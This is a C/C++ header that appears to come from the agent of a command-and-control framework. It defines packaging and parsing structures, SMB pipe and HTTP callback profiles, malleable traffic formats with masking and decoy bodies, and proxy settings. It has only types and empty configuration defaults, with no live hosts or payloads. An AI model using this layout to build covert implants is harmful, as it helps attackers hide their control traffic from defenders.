#include <windows.h>

/* ============ [ socket cases ] ============ */

#define KH_SOCKET_NEW   0
#define KH_SOCKET_DATA  1
#define KH_SOCKET_CLOSE 2

/* ============ [ transport structs ] ============ */

typedef struct {
    PVOID   Buffer;
    size_t  Length;
    size_t  Size;
    BOOL    Encrypt;
    CHAR*   TaskUUID;
} PACKAGE, *PPACKAGE;

typedef struct {
    PCHAR   Original;
    PCHAR   Buffer;
    UINT32  Size;
    UINT32  Length;
} PARSER, *PPARSER;

struct _SMB_PROFILE_DATA {
    CHAR* SmbUUID;
    CHAR* AgentUUID;
    
    HANDLE Handle;

    PACKAGE* Pkg;
    PARSER*  Psr;

    _SMB_PROFILE_DATA* Next;
};
typedef _SMB_PROFILE_DATA SMB_PROFILE_DATA;

enum class Base64Action {
    Get_Size,
    Encode,
    Decode
};

enum class Base64URLAction {
    Get_Size,
    Encode,
    Decode
};

enum class Base32Action {
    Get_Size,
    Encode,
    Decode
};

enum class HexAction {
    Get_Size,
    Encode,
    Decode
};

typedef enum class OutputFmt {
    Raw,
    Hex,
    Base32,
    Base64,
    Base64Url
};

typedef enum _INPUT_TYPE {
    Input_Header,
    Input_Body
} INPUT_TYPE;

typedef enum _OUTPUT_TYPE {
    Output_Parameter,
    Output_Header,
    Output_Body,
    Output_Cookie
} OUTPUT_TYPE;

typedef struct _ARRAY_PAIRA {
    CHAR* Key;
    CHAR* Value;
} ARRAY_PAIRA;

typedef struct _ARRAY_PAIRW {
    WCHAR* Key;
    WCHAR* Value;
} ARRAY_PAIRW;

typedef struct _OUTPUT_FORMAT {
    OUTPUT_TYPE Type;
    OutputFmt   Format;
    BOOL        Mask;
    
    union { 
        struct {
            WCHAR* Ptr;
            ULONG  Size;
        } Parameter;

        struct {
            WCHAR* Ptr;
            ULONG  Size;
        } Cookie;

        struct {
            WCHAR* Ptr;
            ULONG  Size;
        } Header;

        struct {
            PBYTE Ptr; 
            ULONG Size;
        } Body;

        struct {
            PBYTE Ptr; 
            ULONG Size;
        } OutputBuff;
    };

    ULONG MaxDataSize;

    MM_INFO Append;
    MM_INFO Prepend;
    MM_INFO FalseBody;
} OUTPUT_FORMAT;

typedef struct _HTTP_ENDPOINT {
    WCHAR*         Path;
    OUTPUT_FORMAT  ServerOutput;
    OUTPUT_FORMAT  ClientOutput;
    
    MM_INFO        Parameters;
} HTTP_ENDPOINT;

typedef struct _HTTP_METHOD_ENDPOINTS {
    HTTP_ENDPOINT** Endpoints;      
    ULONG           EndpointCount;  

    WCHAR*          Headers;
    
    ARRAY_PAIRW**   Cookies;
    ULONG           CookiesCount;

    MM_INFO         DoNothingBuff;
} HTTP_METHOD;

typedef struct _HTTP_CALLBACKS {
    WCHAR*       Host;
    ULONG        Port;
    
    WCHAR*       UserAgent;
    
    ULONG        Method;
    HTTP_METHOD  Get;           // Endpoints GET
    HTTP_METHOD  Post;          // Endpoints POST
} HTTP_CALLBACKS;

typedef struct _PROXY_SETTINGS {
    BOOL Enabled;
    
    WCHAR* Url;
    WCHAR* Username;
    WCHAR* Password;
} PROXY_SETTINGS;

struct HTTP_CONTEXT {
    HANDLE SessionHandle    = nullptr;
    HANDLE ConnectHandle    = nullptr;
    HANDLE RequestHandle    = nullptr;
    
    WCHAR*  wTargetUrl       = nullptr;
    CHAR*   cTargetUrl       = nullptr;
    WCHAR*  Path             = nullptr;
    WCHAR*  Headers          = nullptr;
    MM_INFO Body            = { 0 };

    struct {
        PVOID* Ptr;
        ULONG  Length;
    } ObjectFree;
    
    BOOL Success = FALSE;
};

/* ============ [ profile types ] ============ */

#define PROFILE_SMB  0x15
#define PROFILE_HTTP 0x25

#ifndef PROFILE_C2
#define PROFILE_C2 PROFILE_HTTP
#endif // PROFILE_C2

/* ============ [ smb profile ] ============ */

#ifndef SMB_PIPE_NAME
#define SMB_PIPE_NAME L""
#endif // SMB_PIPE_NAME

/* ============ [ http basic config ] ============ */

#ifndef HTTP_USER_AGENT
#define HTTP_USER_AGENT L""
#endif // WEB_USER_AGENT

#ifndef HTTP_SECURE_ENABLED
#define HTTP_SECURE_ENABLED TRUE
#endif // WEB_SECURE_ENABLED

#ifndef HTTP_PROXY_ENABLED
#define HTTP_PROXY_ENABLED FALSE
#endif // WEB_PROXY_ENABLED

#ifndef HTTP_PROXY_URL
#define HTTP_PROXY_URL L""
#endif // WEB_PROXY_URL

#ifndef HTTP_PROXY_USERNAME
#define HTTP_PROXY_USERNAME L""
#endif // WEB_PROXY_USERNAME

#ifndef HTTP_PROXY_PASSWORD
#define HTTP_PROXY_PASSWORD L""
#endif // WEB_PROXY_PASSWORD

#ifndef HTTP_MALLEABLE_BYTES
#define HTTP_MALLEABLE_BYTES { 0x00 }
#endif // HTTP_MALLEABLE_BYTES

#define HTTP_METHOD_ONLY_GET  0x100
#define HTTP_METHOD_ONLY_POST 0x150
#define HTTP_METHOD_USE_BOTH  0x200

/* ============ [ http callback config ] ============ */

#ifndef HTTP_CALLBACK_COUNT
#define HTTP_CALLBACK_COUNT 1
#endif // HTTP_CALLBACK_COUNT

